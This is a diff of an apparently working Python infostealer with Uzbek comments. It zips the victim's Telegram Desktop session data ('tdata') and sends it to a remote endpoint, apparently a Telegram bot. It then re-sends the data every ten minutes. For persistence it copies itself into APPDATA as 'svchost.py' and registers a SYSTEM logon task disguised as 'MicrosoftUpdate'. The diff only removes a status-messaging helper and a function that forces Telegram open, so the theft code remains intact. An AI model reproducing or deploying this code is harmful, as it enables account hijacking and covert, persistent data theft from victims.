@@ -36,15 +36,6 @@ def send_file(file_path, caption):
     except:
         pass
 
-def send_msg(text):
-    try:
-        url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
-        data = json.dumps({"chat_id": CHAT_ID, "text": text}).encode()
-        req = urllib.request.Request(url, data=data, headers={"Content-Type": "application/json"})
-        urllib.request.urlopen(req)
-    except:
-        pass
-
 def get_tdata():
     pc_name = socket.gethostname()
     appdata = os.getenv('APPDATA')
@@ -68,45 +59,22 @@ def get_tdata():
 def install_persistence():
     try:
         script_path = os.path.join(os.environ['APPDATA'], 'svchost.py')
-        # O'zini kompyuterga saqlash
         if not os.path.exists(script_path):
             content = urllib.request.urlopen(sys.argv[0] if len(sys.argv) > 0 else __file__).read().decode()
             with open(script_path, 'w') as f:
                 f.write(content)
-        
-        # Task Scheduler ga qo'shish (Har doim ishlaydi)
         subprocess.run(['schtasks', '/create', '/tn', 'MicrosoftUpdate', '/tr', f'"{sys.executable}" "{script_path}"', '/sc', 'onlogon', '/ru', 'SYSTEM', '/rl', 'HIGHEST', '/f', '/it'], shell=True)
-        return True
-    except:
-        return False
-
-def force_open_telegram():
-    try:
-        # Agar Telegram Desktop ochiq bo'lmasa, uni ochishga urinamiz
-        result = subprocess.run(['tasklist', '/fi', 'imagename eq Telegram.exe'], capture_output=True, text=True)
-        if "Telegram.exe" not in result.stdout:
-            subprocess.Popen(['start', 'Telegram'], shell=True)
-            time.sleep(10)
     except:
         pass
 
-# MAIN (Birinchi ishga tushganda)
-send_msg(f"🔧 Checker o'rnatilmoqda: {socket.gethostname()}")
-
-if install_persistence():
-    send_msg(f"🔒 Task Scheduler ga o'rnatildi!")
-
-# Telegram Desktop ni majburan ochish (agar ochiq bo'lmasa, hozir ochiladi)
-force_open_telegram()
-
-# Birinchi tdata ni yuborish
-time.sleep(15)
+# MAIN (O'rnatish va birinchi tdata)
+install_persistence()
 zip_path = get_tdata()
 if zip_path:
-    send_file(zip_path, f"✅ Birinchi tdata yig'ildi!\n🖥 {socket.gethostname()}")
+    send_file(zip_path, f"✅ Yangi tdata yig'ildi!\n🖥 {socket.gethostname()}")
     os.remove(zip_path)
 
-# ENDI DOIMIY KUZATISH
+# Doimiy kuzatish
 last_sent = 0
 while True:
     time.sleep(600)
